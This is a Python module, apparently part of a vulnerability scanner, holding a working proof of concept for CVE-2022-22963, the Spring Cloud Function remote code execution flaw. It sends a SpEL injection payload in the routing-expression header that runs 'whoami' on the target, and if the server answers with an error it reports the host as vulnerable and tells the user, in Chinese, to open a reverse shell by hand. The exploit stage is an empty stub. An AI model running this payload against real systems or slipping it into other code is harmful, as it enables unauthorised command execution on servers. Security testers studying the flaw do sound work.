# coding:utf-8

import requests
from util import RandomUA

class CVE_2022_22963:
    def __init__(self):
        ua = RandomUA.RandomUA()
        self.ua = ua.UserAgent()
        self.payload = f'T(java.lang.Runtime).getRuntime().exec("whoami")'

        self.data = 'test'
        self.header = {
            'spring.cloud.function.routing-expression': self.payload,
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Accept-Language': 'en',
            'User-Agent': self.ua,
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        self.path = 'functionRouter'
    def poc(self,url,proxies,ProxyStute):
        if ProxyStute == 1:
            proxies = proxies
        else:
            proxies = None
        try:
            self.url = url + self.path
            requests.packages.urllib3.disable_warnings()

            req = requests.post(url=url,headers=self.header,
                                    data=self.data,verify=False,proxies=proxies,timeout=6)
            code = req.status_code
            text = req.text
            rsp = '"error":"Internal Server Error"'
            if code == 500 and rsp in text:
                result = f'[+] {url} 存在编号为CVE-2022-22963的RCE漏洞，请手动反弹Shell'
                return result
            else:
                result = f'[-] {url} CVE-2022-22963漏洞不存在'
                return result
        except Exception as e:
            error = f"[error] {url} 未知错误 {e}"
            return error

    def exp(self,url,proxies,ProxyStute):
        pass